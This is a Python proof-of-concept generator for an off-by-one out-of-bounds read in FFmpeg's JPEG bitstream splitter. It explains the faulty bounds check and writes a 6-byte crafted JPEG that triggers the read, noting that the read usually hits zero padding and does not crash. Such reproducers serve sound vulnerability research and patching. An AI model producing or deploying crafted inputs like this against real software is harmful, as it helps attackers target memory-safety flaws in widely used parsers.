#!/usr/bin/env python3
"""
PoC generator for VULN-001:
Off-by-One OOB Read in cbs_jpeg_split_fragment Non-SOS Marker Processing
File: FFmpeg/libavcodec/cbs_jpeg.c (lines 155-163)

The vulnerability:
  length = AV_RB16(frag->data + i);          // line 154
  if (length > frag->data_size - i) {         // line 155 — allows length == data_size - i
      ...error...
  }
  end = start + length;                        // line 160 — end == data_size when length == data_size - start
  i = end;                                     // line 162 — i == data_size
  if (frag->data[i] != 0xff) {               // line 163 — OOB read at frag->data[data_size]

To trigger:
  - Find `start` (position of length field = marker_pos + 2, after 0xFF and type byte)
  - Set length field value = data_size - start
  - Then: end = start + length = data_size, and data[data_size] is read OOB.

For the crafted file: FF D8 FF FE 00 02
  Position 0-1: FF D8  (SOI)
  Position 2-3: FF FE  (COM marker: 0xFF = marker prefix, 0xFE = COM type)
  Position 4-5: 00 02  (length = 2; includes the 2 length bytes, 0 bytes of COM data)

Trace through cbs_jpeg_split_fragment:
  - SOI found at pos 0-1
  - Next marker: 0xFF at pos 2, type byte 0xFE at pos 3 → marker=0xFE (COM), start=4
  - Non-SOS branch: i=start=4
    - Check: i > data_size-2 → 4 > 4 → FALSE (no error)
    - length = data[4..5] = 0x0002 = 2
    - Check: length > data_size-i → 2 > 6-4=2 → FALSE (no error, off-by-one boundary)
    - end = start + length = 4 + 2 = 6 = data_size
    - i = end = 6
    - frag->data[6] READ → OOB! (data_size is 6, valid indices 0..5)

Note: In standard ffmpeg, AV_INPUT_BUFFER_PADDING_SIZE=64 bytes of zero padding are
appended during I/O, so the OOB byte is typically 0x00 (padding) and does not crash.
The effect is next_marker = -1 (since 0x00 != 0xFF), causing early termination of
JPEG parsing. ASAN would catch it only if padding is absent (e.g., with custom allocator).
"""

import struct
import os

def generate_poc(output_path):
    # SOI: 2 bytes
    SOI = b'\xff\xd8'
    # COM marker: 0xFF prefix + 0xFE type byte
    COM_MARKER = b'\xff\xfe'
    # Length = 2 (minimum: just the 2 length bytes, no actual COM data)
    # This makes: length (2) == data_size (6) - start (4)
    # So end = 4 + 2 = 6 = data_size → OOB read at data[6]
    LENGTH = struct.pack('>H', 2)

    crafted = SOI + COM_MARKER + LENGTH
    # Total: 6 bytes
    # Verification:
    data_size = len(crafted)
    # start = 4 (position after marker 0xFF at 2 and type 0xFE at 3)
    start = 4
    length_val = struct.unpack('>H', crafted[start:start+2])[0]
    end = start + length_val
    print(f"[*] Crafted JPEG: {crafted.hex(' ')}")
    print(f"[*] data_size={data_size}, start={start}, length={length_val}, end={end}")
    if end == data_size:
        print(f"[*] TRIGGER: end ({end}) == data_size ({data_size})")
        print(f"[*] OOB read will occur at frag->data[{end}] (past end of buffer)")
    else:
        print(f"[!] WARNING: end ({end}) != data_size ({data_size}), trigger may not fire")

    with open(output_path, 'wb') as f:
        f.write(crafted)
    print(f"[*] Written to: {output_path} ({data_size} bytes)")

if __name__ == '__main__':
    script_dir = os.path.dirname(os.path.abspath(__file__))
    output_path = os.path.join(script_dir, 'vuln_001_input.jpg')
    generate_poc(output_path)
